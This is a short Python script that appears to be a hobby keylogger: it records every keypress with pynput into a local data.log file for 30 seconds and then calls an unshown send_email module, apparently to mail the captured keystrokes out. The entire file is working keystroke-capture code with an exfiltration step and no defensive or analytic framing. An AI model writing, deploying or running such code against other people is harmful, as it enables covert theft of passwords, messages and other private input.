from pynput import keyboard
import send_email
import time
import threading
import os


def get_keys_rb():
    with open('data.log', 'rb') as file:
        text = file.read()
        file.close()
    return text


def get_keys():
    with open('data.log', 'r') as file:
        text = file.read()
        file.close()
    return text


def add_key(key: str):
    keys = get_keys()
    with open('data.log', 'w') as file:
        file.write(f'{keys}{key} ')
        file.close()


def on_press(key):
    try:
        key_name = key.char
    except:
        key_name = key.name
    add_key(key_name)
    return False


def keyboard_listener():
    while True:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
        if stop_threads:
            break


def my_timer():
    time.sleep(30)
    return 0


def main():
    if os.path.exists('data.log'):
        os.remove('data.log')
    with open('data.log', 'w') as file:
        file.write(' ')
    print("start typing whatever you want: \n")
    t1 = threading.Thread(target=keyboard_listener)
    t2 = threading.Thread(target=my_timer)
    global stop_threads
    stop_threads = False
    t1.start()
    t2.start()
    t2.join()
    stop_threads = True
    t1.join()
    send_email.send_email()


if __name__ == '__main__':
    main()
